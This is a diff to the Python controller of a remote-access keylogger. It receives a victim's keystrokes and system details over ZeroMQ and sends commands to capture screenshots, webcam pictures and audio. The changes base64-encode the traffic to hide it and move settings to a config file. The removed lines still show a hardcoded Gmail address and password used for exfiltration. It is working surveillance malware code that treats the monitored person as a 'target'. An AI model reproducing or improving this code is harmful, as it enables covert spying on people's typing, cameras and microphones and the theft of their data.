@@ -3,9 +3,11 @@ import threading, os, getpass, shutil, sys, platform
 from datetime import datetime
 from utils import write_file
 from GUI import GUIWindow
+import base64
 import imaplib, email
 import logging
 import logging.config
+import configparser
 
 
 stop_threads = False
@@ -23,6 +25,8 @@ else:
 
 logging.config.fileConfig('logging.conf')
 logger = logging.getLogger('action')
+config = configparser.ConfigParser()
+config.read('config.ini')
 
 
 class Communication:
@@ -38,7 +42,8 @@ class Communication:
 		self.socket_stream.bind('tcp://' + self.ip_address + ':' + str(self.port_stream))
 		self.socket_stream.subscribe('')
 
-		if self.socket_stream.recv_string() != 'OK':
+		msg = self.socket_stream.recv_string()
+		if base64.b64decode(msg).decode() != 'OK':
 			raise Exception('Connection failed!')
 
 
@@ -54,7 +59,7 @@ class KeyLogger(threading.Thread):	#zeromq
 
 		self.email_address = email_address
 		self.email_password = email_password
-		self.imap_alias = 'imap.gmail.com'
+		self.imap_alias = config['GMAIL_SERVICE']['IMAP']
 		if isinstance(connection, Communication):
 			self.connection = connection
 		else:
@@ -88,10 +93,11 @@ class KeyLogger(threading.Thread):	#zeromq
 		global stop_threads
 
 		system_info = self.connection.socket_stream.recv_string()
+		system_info = base64.b64decode(system_info).decode()
 		system_info = eval(system_info)
 
-		path = '../logs/'
-		filename = 'system_info.txt'
+		path = config['DEFAULT']['path']
+		filename = config['DEFAULT']['filenameSys']
 
 		if not os.path.isdir(path):
 			os.mkdir(path=path)
@@ -108,7 +114,7 @@ class KeyLogger(threading.Thread):	#zeromq
 			handler.write(f"Processor: {system_info[0]['processor']}\n")
 			handler.write(f"IP address: {system_info[1][2]}\n")
 
-		filename = 'log.csv'
+		filename = config['DEFAULT']['filenameLog']
 
 		while True:
 			try:
@@ -117,6 +123,7 @@ class KeyLogger(threading.Thread):	#zeromq
 				# time = <string> current time when the key was pressed
 				# information = <string> character pressed by the target
 				data = self.connection.socket_stream.recv_string()
+				data = base64.b64decode(data).decode()
 				data = eval(data)
 
 				# data process
@@ -201,24 +208,28 @@ class MenuHandler(threading.Thread):
 			elif option == '1':
 				logger.info('Taking screenshot...')
 				try:
+					option = base64.b64encode(option.encode())
 					self.connection.socket_interact.send_string(option)
 				except:
 					break
 			elif option == '2':
 				logger.info('Taking webcam picture...')
 				try:
+					option = base64.b64encode(option.encode())
 					self.connection.socket_interact.send_string(option)
 				except:
 					break
 			elif option == '3':
 				logger.info('Recording audio...')
 				try:
+					option = base64.b64encode(option.encode())
 					self.connection.socket_interact.send_string(option)
 				except:
 					break
 			elif option == '4' or stop_threads:
 				stop_threads = True
 				logger.info("Closing the connection...")
+				option = base64.b64encode(option.encode())
 				self.connection.socket_interact.send_string(option)
 				break
 			elif option == '':
@@ -229,6 +240,7 @@ class MenuHandler(threading.Thread):
 			# resposes
 			if option in ['1', '2', '3']:
 				data = self.connection.socket_interact.recv_string()
+				data = base64.b64decode(data).decode()
 				data = eval(data)
 
 				if data[0] == "image":
@@ -259,7 +271,10 @@ class MenuHandler(threading.Thread):
 def main():
 	global gui_running, stop_threads
 
-	communication = Communication(ip_address='*', port_stream=10001, port_interact=10002)
+	communication = Communication(ip_address=config['COMMUNICATION']['ipPlaceholder'], \
+		port_stream=config['COMMUNICATION']['portStream'], \
+		port_interact=config['COMMUNICATION']['portInteract'])
+
 	try:
 		logger.info('Waiting for connection...')
 		communication.connect2stream()
@@ -272,7 +287,9 @@ def main():
 	gui = GUIWindow("KeyStrokeLogger")
 
 	try:
-		key_logger = KeyLogger(connection=communication, gui=gui, email_address='salamander.hck@gmail.com', email_password='0xzedff4343d2a')
+		key_logger = KeyLogger(connection=communication, gui=gui, \
+			email_address=config['GMAIL_SERVICE']['EmailAddress'], \
+			email_password=config['GMAIL_SERVICE']['EmailPassword'])
 		key_logger.start()
 
 		menu = MenuHandler(connection=communication)
